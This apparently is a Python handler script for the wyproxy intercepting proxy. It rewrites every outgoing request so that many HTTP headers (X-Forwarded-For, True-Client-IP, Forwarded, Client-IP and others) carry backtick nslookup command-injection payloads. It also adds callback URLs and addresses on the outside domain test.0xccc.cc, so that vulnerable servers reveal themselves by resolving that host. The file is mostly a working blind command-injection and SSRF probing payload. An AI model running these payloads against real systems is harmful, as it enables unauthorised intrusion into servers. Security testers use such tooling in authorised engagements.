# encoding:utf-8

import uuid
"""You can write youself control code in here..."""

def wyproxy_request_handle(flow):
    """wyproxy send data to server before processing"""
    random1 = str(uuid.uuid1())
    random2 = str(uuid.uuid1())
    flow.request.anticache()  # disable cache
    flow.request.anticomp()   # disable gzip compress
    print(flow.request.url)
    # change the request headers['Host']
    # try:
    #     if not flow.request.headers['Host']:
    #         flow.request.headers['Host'] = '0'
    #         flow.request.headers['Host'] = flow.request.headers['Host'] + '.`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    # except:
    #     pass
    if not flow.request.headers['User-Agent']:
        flow.request.headers['User-Agent'] = '0'
    
    flow.request.headers['User-Agent'] = flow.request.headers['User-Agent'] + 'root@%s.test.0xccc.cc' %random1
    flow.request.headers['True-Client-IP'] = '`nslookup  %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['Forwarded'] ='for=`nslookup %s.test.0xccc.cc`. %s.test.0xccc.cc;by=`nslookup %s.test.0xccc.cc`. %s.test.0xccc.cc;host=`nslookup %s.test.0xccc.cc`%s.test.0xccc.cc' %(random2,random1,random2,random1,random2,random1)
    flow.request.headers['From'] ='root@%s.test.0xccc.cc' %random1
    flow.request.headers['X-Real-IP'] ='`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['X-Wap-Profile'] ='http://%s.test.0xccc.cc/wap.xml' %random1
    flow.request.headers['Client-IP'] ='`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['Referer'] ='http://%s.test.0xccc.cc/ref' %random1
    flow.request.headers['X-Forwarded-For'] ='`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['Contact'] ='root@%s.test.0xccc.cc' %random1
    flow.request.headers['X-Client-IP'] ='`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['X-Originating-IP'] ='`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['Proxy'] ='`nslookup %s.test.0xccc.cc`.%s.test.0xccc.cc' %(random2,random1)
    flow.request.headers['random'] = random1+'/'+random2


def wyproxy_response_handle(flow):
    """wyproxy request task is over"""

    # print(flow.request.url)
    # print(flow.request.headers)
    # print(flow.response.headers)
    pass
